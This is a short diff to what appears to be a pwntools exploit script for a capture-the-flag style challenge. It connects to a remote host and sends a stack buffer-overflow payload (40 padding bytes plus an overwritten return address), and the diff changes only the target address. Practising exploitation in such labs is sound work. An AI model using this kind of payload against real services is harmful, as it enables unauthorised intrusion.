@@ -5,7 +5,7 @@ r = remote("130.192.5.212", 1951)
 
 r.recvline()
 
-line = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + b'bbbbbbbb' + p64(0x400687)
+line = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + b'bbbbbbbb' + p64(0x4011bb)
 
 r.sendline(line)
 
